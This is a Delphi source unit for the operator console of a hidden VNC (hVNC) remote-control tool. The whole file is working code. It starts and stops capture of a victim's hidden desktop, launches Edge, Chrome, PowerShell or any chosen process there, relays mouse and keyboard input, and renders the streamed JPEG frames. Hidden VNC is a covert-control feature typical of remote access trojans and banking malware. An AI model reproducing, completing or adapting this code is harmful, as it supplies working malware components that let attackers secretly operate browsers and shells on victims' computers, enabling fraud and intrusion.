unit UnitHiddenVNC;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.ComCtrls, Vcl.ExtCtrls, Vcl.StdCtrls,
  System.JSON, System.SyncObjs, ncLines, Vcl.Imaging.jpeg, System.UITypes;

type
  THiddenVNCFrameHeader = packed record
    Width    : Cardinal;
    Height   : Cardinal;
    Format   : Cardinal; // 1: JPEG
    DataSize : Cardinal;
  end;

  TSendJSONCallback = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterCallback = procedure(aLine: TncLine) of object;

  TForm10 = class(TForm)
    PaintBox1: TPaintBox;
    StatusBar1: TStatusBar;
    Panel1: TPanel;
    Button1: TButton;
    ComboBox1: TComboBox;
    ComboBox2: TComboBox;
    Button2: TButton;
    Button3: TButton;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure Button1Click(Sender: TObject);
    procedure Button2Click(Sender: TObject);
    procedure Button3Click(Sender: TObject);
    procedure PaintBox1Paint(Sender: TObject);
    procedure PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure PaintBox1MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure FormKeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
    FLine: TncLine;
    FClientID: string;
    FSendJSON: TSendJSONCallback;
    FOnUnregister: TUnregisterCallback;

    FLock: TCriticalSection;
    FLastBitmap: TBitmap;
    FIsCapturing: Boolean;

    procedure DrawFrame(const FrameBytes: TBytes);
  public
    procedure SetupForClient(aLine: TncLine; const ClientID: string;
      ASendJSON: TSendJSONCallback; AOnUnregister: TUnregisterCallback);
    procedure HandleHiddenVNCJSON(JSONObj: TJSONObject);
    procedure HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
    procedure DetachCallbacks;
  end;

var
  Form10: TForm10;

implementation

{$R *.dfm}

procedure TForm10.FormCreate(Sender: TObject);
begin
  FLock := TCriticalSection.Create;
  FLastBitmap := TBitmap.Create;
  FIsCapturing := False;

  KeyPreview := True;
  OnKeyDown := FormKeyDown;
  OnKeyUp := FormKeyUp;
  OnClose := FormClose;

  ComboBox1.Items.Clear;
  ComboBox1.Items.Add('10%');
  ComboBox1.Items.Add('20%');
  ComboBox1.Items.Add('30%');
  ComboBox1.Items.Add('40%');
  ComboBox1.Items.Add('50%');
  ComboBox1.Items.Add('60%');
  ComboBox1.Items.Add('70%');
  ComboBox1.Items.Add('80%');
  ComboBox1.Items.Add('90%');
  ComboBox1.Items.Add('100%');
  ComboBox1.ItemIndex := 4; // 50% default

  ComboBox2.Items.Clear;
  ComboBox2.Items.Add('Edge');
  ComboBox2.Items.Add('Chrome');
  ComboBox2.Items.Add('PowerShell');
  ComboBox2.ItemIndex := 0;
end;

procedure TForm10.FormDestroy(Sender: TObject);
begin
  if Assigned(FOnUnregister) then
    FOnUnregister(FLine);

  FLastBitmap.Free;
  FLock.Free;
end;

procedure TForm10.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Action := caFree;
end;

procedure TForm10.SetupForClient(aLine: TncLine; const ClientID: string;
  ASendJSON: TSendJSONCallback; AOnUnregister: TUnregisterCallback);
begin
  FLine := aLine;
  FClientID := ClientID;
  FSendJSON := ASendJSON;
  FOnUnregister := AOnUnregister;

  Caption := 'Hidden VNC - ' + ClientID;
end;

procedure TForm10.DetachCallbacks;
begin
  FSendJSON := nil;
  FOnUnregister := nil;
end;

procedure TForm10.Button1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  QualityStr: string;
  Quality: Integer;
begin
  if not FIsCapturing then
  begin
    QualityStr := StringReplace(ComboBox1.Text, '%', '', [rfReplaceAll]);
    Quality := StrToIntDef(QualityStr, 50);

    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'hvnc_start');
      JSONObj.AddPair('quality', TJSONNumber.Create(Quality));
      FSendJSON(FLine, JSONObj);
    finally
      JSONObj.Free;
    end;
    Button1.Caption := 'Stop Capture';
    FIsCapturing := True;
  end
  else
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'hvnc_stop');
      FSendJSON(FLine, JSONObj);
    finally
      JSONObj.Free;
    end;
    Button1.Caption := 'Start Capture';
    FIsCapturing := False;
  end;
end;

procedure TForm10.Button2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  ProcName: string;
begin
  ProcName := ComboBox2.Text;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_run');
    JSONObj.AddPair('path', ProcName);
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
  StatusBar1.SimpleText := ProcName + ' opening...';
end;

procedure TForm10.Button3Click(Sender: TObject);
var
  CustomPath: string;
  JSONObj: TJSONObject;
begin
  if InputQuery('Run Custom Process', 'Enter process path or name:', CustomPath) then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'hvnc_run');
      JSONObj.AddPair('path', CustomPath);
      FSendJSON(FLine, JSONObj);
    finally
      JSONObj.Free;
    end;
    StatusBar1.SimpleText := 'Custom process opening: ' + CustomPath;
  end;
end;

procedure TForm10.HandleHiddenVNCJSON(JSONObj: TJSONObject);
var
  Action: string;
  Status: string;
  Msg: string;
begin
  Action := JSONObj.GetValue('action').Value;
  if Action = 'hvnc_status' then
  begin
    Status := JSONObj.GetValue('status').Value;
    StatusBar1.SimpleText := 'Status: ' + Status;
  end
  else if Action = 'hvnc_error' then
  begin
    Msg := JSONObj.GetValue('error').Value;
    MessageDlg('hVNC Error: ' + Msg, mtError, [mbOK], 0);
    StatusBar1.SimpleText := 'Error: ' + Msg;
  end;
end;

procedure TForm10.HandleBinaryPacket(PacketType: Byte; const Payload: TBytes);
var
  Header: THiddenVNCFrameHeader;
  FrameData: TBytes;
begin
  if Cardinal(Length(Payload)) < SizeOf(THiddenVNCFrameHeader) then Exit;

  Move(Payload[0], Header, SizeOf(THiddenVNCFrameHeader));
  if (Header.DataSize > 0) and (Cardinal(Length(Payload)) >= (SizeOf(THiddenVNCFrameHeader) + Header.DataSize)) then
  begin
    SetLength(FrameData, Header.DataSize);
    Move(Payload[SizeOf(THiddenVNCFrameHeader)], FrameData[0], Header.DataSize);
    DrawFrame(FrameData);
  end;
end;

procedure TForm10.DrawFrame(const FrameBytes: TBytes);
var
  MS: TMemoryStream;
begin
  MS := TMemoryStream.Create;
  try
    if Length(FrameBytes) > 0 then
      MS.WriteBuffer(FrameBytes[0], Length(FrameBytes));
    MS.Position := 0;

    TThread.Synchronize(nil,
      procedure
      var
        Jpg: TJPEGImage;
      begin
        FLock.Enter;
        try
          Jpg := TJPEGImage.Create;
          try
            Jpg.LoadFromStream(MS);
            FLastBitmap.SetSize(Jpg.Width, Jpg.Height);
            FLastBitmap.Canvas.Draw(0, 0, Jpg);
          finally
            Jpg.Free;
          end;
        finally
          FLock.Leave;
        end;
        PaintBox1.Invalidate;
      end);
  finally
    MS.Free;
  end;
end;

procedure TForm10.PaintBox1Paint(Sender: TObject);
begin
  FLock.Enter;
  try
    if not FLastBitmap.Empty then
      PaintBox1.Canvas.StretchDraw(PaintBox1.ClientRect, FLastBitmap);
  finally
    FLock.Leave;
  end;
end;

procedure TForm10.PaintBox1MouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  JSONObj: TJSONObject;
begin
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_mouse');
    JSONObj.AddPair('event', 'down');
    JSONObj.AddPair('button', IntToStr(Ord(Button)));
    JSONObj.AddPair('x', TJSONNumber.Create(X * 65535 div PaintBox1.Width));
    JSONObj.AddPair('y', TJSONNumber.Create(Y * 65535 div PaintBox1.Height));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.PaintBox1MouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
var
  JSONObj: TJSONObject;
begin
  if ssLeft in Shift then
  begin
    JSONObj := TJSONObject.Create;
    try
      JSONObj.AddPair('action', 'hvnc_mouse');
      JSONObj.AddPair('event', 'move');
      JSONObj.AddPair('x', TJSONNumber.Create(X * 65535 div PaintBox1.Width));
      JSONObj.AddPair('y', TJSONNumber.Create(Y * 65535 div PaintBox1.Height));
      FSendJSON(FLine, JSONObj);
    finally
      JSONObj.Free;
    end;
  end;
end;

procedure TForm10.PaintBox1MouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
var
  JSONObj: TJSONObject;
begin
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_mouse');
    JSONObj.AddPair('event', 'up');
    JSONObj.AddPair('button', IntToStr(Ord(Button)));
    JSONObj.AddPair('x', TJSONNumber.Create(X * 65535 div PaintBox1.Width));
    JSONObj.AddPair('y', TJSONNumber.Create(Y * 65535 div PaintBox1.Height));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm10.FormKeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
var
  JSONObj: TJSONObject;
begin
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_key');
    JSONObj.AddPair('event', 'down');
    JSONObj.AddPair('key', TJSONNumber.Create(Key));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
  Key := 0;
end;

procedure TForm10.FormKeyUp(Sender: TObject; var Key: Word; Shift: TShiftState);
var
  JSONObj: TJSONObject;
begin
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'hvnc_key');
    JSONObj.AddPair('event', 'up');
    JSONObj.AddPair('key', TJSONNumber.Create(Key));
    FSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
  Key := 0;
end;

end.
